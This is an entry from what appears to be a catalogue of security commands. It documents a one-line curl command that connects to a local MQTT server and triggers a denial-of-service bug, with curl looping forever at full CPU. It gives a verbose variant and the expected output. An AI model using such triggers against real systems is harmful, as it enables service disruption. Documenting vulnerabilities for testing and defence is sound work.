---
data: 'curl mqtt://localhost:12345'
tags:
  - dos
  - curl
  - mqtt
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.652Z'
id: a6de6b11-128c-4a47-9884-b8d4abab9e07
verified: false
validated: true
submitted: true
---
# curl-mqtt-dos-trigger

## Command

```bash
curl mqtt://localhost:12345
```

## Description

This command connects curl to a local MQTT server on port 12345, triggering the DoS vulnerability by parsing the partial response and entering an infinite loop on connection closure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `mqtt://localhost:12345` | MQTT URL scheme targeting localhost port 12345 | Yes |

## Examples

### Basic Usage

```bash
curl mqtt://localhost:12345
```

### Advanced Usage

```bash
curl -v mqtt://localhost:12345
```

## Expected Output

curl hangs with repeated internal logs (if verbose) like 'mqtt_doing: state [0]', consuming 100% CPU without completing. Manual kill or timeout required to stop.

## Related

- [[commands/curl-mqtt-with-timeout]]
- [[procedures/Trigger-curl-DoS-with-MQTT-URL]]
